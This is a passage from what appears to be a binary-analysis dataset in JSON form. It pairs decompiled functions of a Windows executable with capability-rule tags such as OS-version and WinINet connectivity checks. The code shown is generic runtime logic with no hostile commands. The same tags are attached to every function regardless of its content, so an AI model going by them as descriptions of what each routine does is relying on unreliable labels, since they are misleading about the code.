*var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 0xe;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x414f60;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00414a34::var_20h;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x414a6e\n    switch(uVar1) {\n    case 0:\n        var_18h = &stack0xfffffffc;\n        fcn.00405530();\n        break;\n    case 1:\n        var_18h = &stack0xfffffffc;\n        if (*0x48fa5c != '\\0') {\n            var_18h = &stack0xfffffffc;\n            fcn.00410e48();\n        }\n        fcn.00405584();\n        break;\n    case 2:\n        var_18h = &stack0xfffffffc;\n        fcn.00409d60();\n        fcn.00405584();\n        break;\n    case 3:\n        var_18h = &stack0xfffffffc;\n        fcn.00409d60();\n        fcn.00405584();\n        break;\n    case 4:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.0040b6d0(var_2ch);\n        fcn.00405584(var_2ch, var_28h, var_24h);\n        break;\n    case 5:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.0040b6d0(var_2ch);\n        fcn.00405584(var_2ch, var_28h, var_24h);\n        break;\n    case 6:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00414744(var_28h, *(param_2 + 6));\n        fcn.004057d4();\n        break;\n    case 7:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.0041477c(var_28h, *(param_2 + 6));\n        fcn.004057d4();\n        break;\n    case 8:\n        var_18h = &stack0xfffffffc;\n        fcn.00405f58(&fcn.00414a34::var_1ch);\n        var_28h = 0x414bc7;\n        fcn.004057d4();\n        break;\n    case 9:\n    case 0xd:\n        var_18h = &stack0xfffffffc;\n        fcn.0041487c();\n        fcn.00405584();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_18h = &stack0xfffffffc;\n            fcn.00405584();\n        }\n        else if (uVar1 == 0x101) {\n            var_18h = &stack0xfffffffc;\n            fcn.00414948();\n            fcn.00405584();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_18h = &stack0xfffffffc;\n            fcn.00405530();\n            cVar2 = fcn.004149ac();\n            if (cVar2 == '\\0') {\n                fcn.0041487c();\n                fcn.00405584();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x414cf6\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_18h = &stack0xfffffffc;\n                fcn.0041487c();\n                fcn.00405584();\n                break;\n            case 2:\n                var_18h = &stack0xfffffffc;\n                fcn.00409d60();\n                fcn.00405584();\n                break;\n            case 3:\n                var_18h = &stack0xfffffffc;\n                fcn.00409d60();\n                fcn.00405584();\n                break;\n            case 4:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.0040b6d0(var_2ch);\n                fcn.00405584(var_2ch, var_28h, var_24h);\n                break;\n            case 5:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.0040b6d0(var_2ch);\n                fcn.00405584(var_2ch, var_28h, var_24h);\n                break;\n            case 6:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00414744(var_28h, (*(param_2 + 4))[1]);\n                fcn.004057d4();\n                break;\n            case 7:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.0041477c(var_28h, (*(param_2 + 4))[1]);\n                fcn.004057d4();\n                break;\n            case 8:\n                var_18h = &stack0xfffffffc;\n                fcn.00405758();\n                break;\n            case 0xb:\n                var_18h = &stack0xfffffffc;\n                fcn.004147b4();\n                fcn.004057d4();\n                break;\n            case 0xc:\n                var_18h = &stack0xfffffffc;\n                fcn.00414a34();\n                break;\n            case 0x10:\n                var_18h = &stack0xfffffffc;\n                fcn.00409d60();\n                fcn.00405584();\n                break;\n            case 0x11:\n                var_18h = &stack0xfffffffc;\n                fcn.00409d60();\n                fcn.00405584();\n                break;\n            case 0x12:\n                var_18h = &stack0xfffffffc;\n                fcn.00409d60();\n                fcn.00405584();\n                break;\n            case 0x13:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00409e4c(var_28h);\n                fcn.00405584(var_28h, 0);\n                break;\n            case 0x14:\n                var_24h._0_1_ = (*(param_2 + 4))[1];\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00409e4c(var_28h);\n                fcn.00405584(var_28h, var_24h);\n            }\n        }\n        break;\n    case 0xb:\n        var_18h = &stack0xfffffffc;\n        fcn.004147b4();\n        fcn.004057d4();\n        break;\n    case 0xc:\n        var_18h = &stack0xfffffffc;\n        fcn.00414a34();\n        break;\n    case 0x10:\n        var_18h = &stack0xfffffffc;\n        fcn.00409d60();\n        fcn.00405584();\n        break;\n    case 0x11:\n        var_18h = &stack0xfffffffc;\n        fcn.00409d60();\n        fcn.00405584();\n        break;\n    case 0x12:\n        var_18h = &stack0xfffffffc;\n        fcn.00409d60();\n        fcn.00405584();\n        break;\n    case 0x13:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00409e4c(var_28h);\n        fcn.00405584(var_28h, 0);\n        break;\n    case 0x14:\n        var_24h._0_1_ = *(param_2 + 6);\n        var_28h = *(param_2 + 4);\n        fcn.00409e4c(var_28h);\n        fcn.00405584(var_28h, var_24h);\n    }\n    *in_FS_OFFSET = var_28h;\n    var_20h = 0x414f67;\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2564
    },
    "0041508c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041508c(uint param_1, uint *param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    uStack48 = 0x415144;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x4150c1;\n    var_4h = param_2;\n    var_5h = fcn.00416168();\n    if (var_5h != '\\0') {\n        puStack56 = &fcn.0041508c::pvarg;\n        puStack60 = 0x4150d3;\n        sub.oleaut32.dll_VariantInit();\n        uStack64 = 0x415127;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))(8);\n        arg_8h = var_4h;\n        fcn.00405e6c();\n        fcn.00405f58(arg_8h);\n        *in_FS_OFFSET = arg_8h;\n        uStack68 = 0x41512e;\n        fcn.0041162c();\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x41514b;\n    uStack48 = 0x415143;\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 454
    },
    "00415154": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00415154(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    float10 fVar4;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    iVar3 = 0xe;\n    do {\n        var_4h = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x415699;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00415154::var_1ch;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x41518d\n    switch(uVar1) {\n    case 0:\n        var_14h = &stack0xfffffffc;\n        fcn.00405d28();\n        break;\n    case 1:\n        var_14h = &stack0xfffffffc;\n        if (*0x48fa5c != '\\0') {\n            var_14h = &stack0xfffffffc;\n            fcn.00410e48();\n        }\n        fcn.00405ea8();\n        break;\n    case 2:\n        var_14h = &stack0xfffffffc;\n        fcn.00409d60();\n        fcn.00405ea8();\n        break;\n    case 3:\n        var_14h = &stack0xfffffffc;\n        fcn.00409d60();\n        fcn.00405ea8();\n        break;\n    case 4:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.0040b6d0(var_28h);\n        fcn.00405ea8(var_28h, var_24h, var_20h);\n        break;\n    case 5:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.0040b6d0(var_28h);\n        fcn.00405ea8(var_28h, var_24h, var_20h);\n        break;\n    case 6:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00414744(var_24h, *(param_2 + 6));\n        fcn.00405d64();\n        break;\n    case 7:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.0041477c(var_24h, *(param_2 + 6));\n        fcn.00405d64();\n        break;\n    case 8:\n        var_24h = 0x4152d9;\n        var_14h = &stack0xfffffffc;\n        fcn.00405f58(in_EAX);\n        break;\n    case 9:\n    case 0xd:\n        var_14h = &stack0xfffffffc;\n        fcn.00414f70();\n        fcn.00405d64();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_14h = &stack0xfffffffc;\n            fcn.00405ea8();\n        }\n        else if (uVar1 == 0x101) {\n            var_14h = &stack0xfffffffc;\n            fcn.00415028();\n            fcn.00405d64();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_14h = &stack0xfffffffc;\n            fcn.00405d28();\n            cVar2 = fcn.0041508c();\n            if (cVar2 == '\\0') {\n                fcn.00414f70();\n                fcn.00405d64();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x415408\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_14h = &stack0xfffffffc;\n                fcn.00414f70();\n                fcn.00405d64();\n                break;\n            case 2:\n                var_14h = &stack0xfffffffc;\n                fcn.00409d60();\n                fcn.00405ea8();\n                break;\n            case 3:\n                var_14h = &stack0xfffffffc;\n                fcn.00409d60();\n                fcn.00405ea8();\n                break;\n            case 4:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.0040b6d0(var_28h);\n                fcn.00405ea8(var_28h, var_24h, var_20h);\n                break;\n            case 5:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.0040b6d0(var_28h);\n                fcn.00405ea8(var_28h, var_24h, var_20h);\n                break;\n            case 6:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00414744(var_24h, (*(param_2 + 4))[1]);\n                fcn.00405d64();\n                break;\n            case 7:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.0041477c(var_24h, (*(param_2 + 4))[1]);\n                fcn.00405d64();\n                break;\n            case 8:\n                var_14h = &stack0xfffffffc;\n                fcn.00405e6c();\n                break;\n            case 0xb:\n                var_14h = &stack0xfffffffc;\n                fcn.004147b4();\n                fcn.00405d64();\n                break;\n            case 0xc:\n                var_14h = &stack0xfffffffc;\n                fcn.00415154();\n                break;\n            case 0x10:\n                var_14h = &stack0xfffffffc;\n                fcn.00409d60();\n                fcn.00405ea8();\n                break;\n            case 0x11:\n                var_14h = &stack0xfffffffc;\n                fcn.00409d60();\n                fcn.00405ea8();\n                break;\n            case 0x12:\n                var_14h = &stack0xfffffffc;\n                fcn.00409d60();\n                fcn.00405ea8();\n                break;\n            case 0x13:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00409e4c(var_24h);\n                fcn.00405ea8(var_24h, 0);\n                break;\n            case 0x14:\n                var_20h._0_1_ = (*(param_2 + 4))[1];\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00409e4c(var_24h);\n                fcn.00405ea8(var_24h, var_20h);\n            }\n        }\n        break;\n    case 0xb:\n        var_14h = &stack0xfffffffc;\n        fcn.004147b4();\n        fcn.00405d64();\n        break;\n    case 0xc:\n        var_14h = &stack0xfffffffc;\n        fcn.00415154();\n        break;\n    case 0x10:\n        var_14h = &stack0xfffffffc;\n        fcn.00409d60();\n        fcn.00405ea8();\n        break;\n    case 0x11:\n        var_14h = &stack0xfffffffc;\n        fcn.00409d60();\n        fcn.00405ea8();\n        break;\n    case 0x12:\n        var_14h = &stack0xfffffffc;\n        fcn.00409d60();\n        fcn.00405ea8();\n        break;\n    case 0x13:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00409e4c(var_24h);\n        fcn.00405ea8(var_24h, 0);\n        break;\n    case 0x14:\n        var_20h._0_1_ = *(param_2 + 6);\n        var_24h = *(param_2 + 4);\n        fcn.00409e4c(var_24h);\n        fcn.00405ea8(var_24h, var_20h);\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x4156a0;\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2598
    },
    "004157ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004157ec(uint param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    \n    iVar1 = *param_2;\n    if (iVar1 == 0) {\n        fcn.0040700c(param_1);\n    }\n    else if (iVar1 == 1) {\n        if (*0x48fa5c != '\\0') {\n            fcn.00410e48();\n        }\n        fcn.0040700c(param_1);\n    }\n    else if (iVar1 == 9) {\n        fcn.00407024();\n    }\n    else if (iVar1 == 0x4009) {\n        fcn.00407024();\n    }\n    else {\n        cVar2 = fcn.00416168();\n        if (cVar2 != '\\0') {\n            fcn.0040700c(param_1);\n            cVar2 = fcn.00404704();\n            if (cVar2 != '\\0') {\n                return;\n            }\n        }\n        fcn.00410e48();\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "00415898": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415898(char param_1, uint param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.004115b0();\n    }\n    if (*0x48fa64 == '\\0') {\n        *in_EAX = 3;\n    }\n    else {\n        *in_EAX = *(param_1 * 2 + 0x48fa78);\n    }\n    *(in_EAX + 4) = param_2;\n    return;\n}\n",
        "token_count": 128
    },
    "00415ec4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00415ec4(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    \n    uStack16 = 0x497994;\n    puStack20 = 0x415ed8;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack24 = 0x415f25;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    iVar1 = fcn.0040676c();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            if (*(*0x497990 + iVar1 * 4) != *0x48fa6c) {\n                fcn.00404650();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x415f2c;\n    uStack24 = 0x497994;\n    uStack28 = 0x415f24;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 279
    },
    "00416168": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __fastcall fcn.00416168(uint param_1, uint *param_2)\n\n{\n    bool bVar1;\n    uint16_t in_AX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_1h;\n    \n    if (((*0x497990 == 0) || (in_AX < 0x100)) || (0x7ff < in_AX)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        uStack24 = 0x497994;\n        puStack28 = 0x4161a3;\n        sub.kernel32.dll_EnterCriticalSection();\n        uStack32 = 0x416210;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &fcn.00416168::var_1h + 1;\n        iVar2 = fcn.0040676c();\n        if (in_AX - 0x100 < iVar2) {\n            *param_2 = *(*0x497990 + -0x400 + in_AX * 4);\n        }\n        *in_FS_OFFSET = uStack36;\n        puStack28 = 0x416217;\n        uStack32 = 0x497994;\n        uStack36 = 0x41620f;\n        uVar3 = sub.kernel32.dll_LeaveCriticalSection();\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 374
    },
    "00416530": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00416530(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*in_EAX == '\\x01') {\n        uVar2 = fcn.00409ecc();\n        return uVar2;\n    }\n    iVar3 = fcn.004164d8();\n    if (*(iVar3 + 1) < 0) {\n        cVar1 = fcn.00409a74();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.00409a74();\n            if (cVar1 == '\\0') {\n                uVar2 = fcn.00409ecc();\n            }\n            else {\n                uVar2 = 0xffffffff;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = fcn.004164e4();\n    }\n    return uVar2;\n}\n",
        "token_count": 214
    },
    "00416604": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00416604(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint8_t uVar5;\n    \n    pcVar1 = **param_2;\n    uVar5 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar5 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[1];\n    if (*(param_2 + 7) < 0xfe) {\n        uVar3 = (*pcVar2)();\n    }\n    else if (*(param_2 + 7) == 0xff) {\n        puVar4 = (pcVar2 & 0xffffff) + in_EAX;\n        uVar3 = in_EAX & 0xffffff00 | *puVar4;\n        if ((1 < uVar5) && (uVar3 = in_EAX & 0xffff0000 | *puVar4,  3 < uVar5)) {\n            uVar3 = *puVar4;\n        }\n    }\n    else {\n        uVar3 = (**(pcVar2 + *in_EAX))();\n    }\n    if (uVar5 < 4) {\n        if (uVar5 < 2) {\n            uVar3 = uVar3;\n            if (uVar5 != 0) {\n                return uVar3 & 0xff;\n            }\n        }\n        else {\n            uVar3 = uVar3;\n            if (uVar5 != 2) {\n                uVar3 = uVar3 & 0xffff;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 397
    },
    "0041a024": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a024(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 4))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "0041a044": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a044(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 8))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "00420730": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420730(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 4))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 100
    },
    "00420750": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420750(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 8))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 100
    },
    "004185b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004185b8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    if (in_EDX == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00418558();\n    }\n    if (in_ECX == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.00418558();\n    }\n    if ((iVar1 != 0) && (iVar2 != 0)) {\n        fcn.0040487c();\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "00418628": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
